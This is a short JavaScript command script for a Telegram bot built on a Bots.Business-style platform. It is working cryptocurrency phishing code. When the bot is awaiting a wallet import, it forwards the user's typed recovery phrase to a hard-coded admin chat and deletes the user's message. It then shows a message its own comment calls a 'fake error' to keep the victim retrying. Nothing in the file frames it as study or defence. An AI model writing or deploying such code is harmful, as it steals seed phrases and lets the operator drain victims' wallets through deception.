/*CMD
  command: /sended
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

var adminID = "7377411824"; // Replace with actual admin ID

// Check if the bot was expecting input
var awaiting = Bot.getProperty("awaiting_wallet_" + user.telegramid);

if (awaiting === "importphrase") {
  // Forward the user’s message to admin
  Api.sendMessage({
    chat_id: adminID,
    text: "<b>🚨 New Recovery Phrase Entry from User:</b>\n\n<code>" + message + "</code>",
    parse_mode: "html",
    reply_markup: {
      inline_keyboard: [[{ text: "💬 Reply to User", callback_data: "/reply_user " + user.telegramid }]]
    }
  });

  // Delete user message
  if (request.message && request.message.message_id) {
    Api.deleteMessage({
      chat_id: user.telegramid,
      message_id: request.message.message_id
    });
  }

  // Send fake error message to the user
  Api.sendMessage({
    chat_id: user.telegramid,
    text: "<b>❌ ERROR DETECTED! CONNECT AN ACTIVE WALLET.</b>",
    parse_mode: "html",
    reply_markup: {
      inline_keyboard: [[{ text: "🔄 Retry", callback_data: "/importwallet" }]]
    }
  });

  // Clear awaiting state
  Bot.setProperty("awaiting_wallet_" + user.telegramid, null, "string");
}
